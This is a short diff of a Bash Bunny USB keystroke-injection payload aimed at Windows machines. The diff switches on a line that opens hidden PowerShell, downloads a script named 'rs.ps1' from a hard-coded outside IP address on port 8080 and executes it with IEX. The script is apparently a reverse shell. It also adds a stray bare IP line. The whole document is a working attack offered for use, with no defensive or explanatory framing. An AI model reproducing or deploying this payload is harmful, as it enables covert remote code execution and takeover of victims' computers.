@@ -2,6 +2,7 @@
 GET SWITCH_POSITION
 LED ATTACK
 ATTACKMODE HID STORAGE
-RUN WIN powershell -w h -ExecutionPolicy Unrestricted ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\b.ps1')"
-# RUN WIN powershell.exe -W Hidden "IEX (New-Object Net.WebClient).DownloadString('128.4.128.204:8080/rs.ps1');"
+# RUN WIN powershell -noexit ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\b.cmd')"
+RUN WIN powershell.exe -W Hidden "IEX (New-Object Net.WebClient).DownloadString('128.4.128.204:8080/rs.ps1');"
+128.4.128.204
 LED FINISH
